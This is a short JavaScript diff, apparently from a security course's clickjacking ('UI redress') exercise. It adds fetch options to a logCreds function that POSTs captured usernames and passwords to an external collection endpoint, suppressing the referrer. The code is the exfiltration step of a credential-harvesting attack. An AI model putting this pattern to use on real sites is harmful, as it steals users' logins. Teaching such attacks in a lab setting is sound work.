@@ -19,6 +19,10 @@ async function logCreds(u, p) {
 
   await fetch("https://m183.gibz-informatik.ch/api/uiredresscredential", {
     method: "POST",
+    mode: 'cors',
+    cache: 'no-cache',
+    credentials: 'omit',
+    referrerPolicy: 'no-referrer',
     headers: {
       "Content-Type": "application/json",
       "X-Api-Key": apiKey,
